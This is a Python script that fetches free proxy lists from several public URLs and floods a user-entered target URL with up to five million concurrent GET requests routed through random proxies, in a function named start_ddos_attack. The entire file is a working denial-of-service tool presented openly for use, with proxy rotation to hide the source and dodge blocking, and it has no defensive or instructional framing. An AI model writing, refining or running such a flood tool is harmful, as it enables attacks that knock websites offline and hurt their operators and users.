from gevent import monkey
monkey.patch_all()

import gevent
from gevent.pool import Pool
import requests
import time
import random

def fetch_proxies():
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies",
        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
        "https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt"
    ]
    proxies = []
    for url in urls:
        try:
            response = requests.get(url)
            proxies.extend(response.text.split())
        except requests.RequestException as e:
            print(f"Failed to fetch proxies from {url}: {e}")
    print(f"Found {len(proxies)} proxies")
    return proxies

def send_request(url, proxies):
    proxy = random.choice(proxies)
    proxies_dict = {"http": proxy, "https": proxy}
    try:
        response = requests.get(url, proxies=proxies_dict, timeout=10)
        print(f"Request sent, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def start_ddos_attack(url, requests_per_second, concurrent_requests):
    proxies = fetch_proxies()
    pool = Pool(concurrent_requests)
    start_time = time.time()

    for _ in range(requests_per_second):
        pool.spawn(send_request, url, proxies)
        gevent.sleep(1 / requests_per_second)

    pool.join()
    end_time = time.time()
    print(f"Completed attack in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    requests_per_second = 5000000
    concurrent_requests = int(input("Enter the number of concurrent requests: "))

    start_ddos_attack(target_url, requests_per_second, concurrent_requests)
    
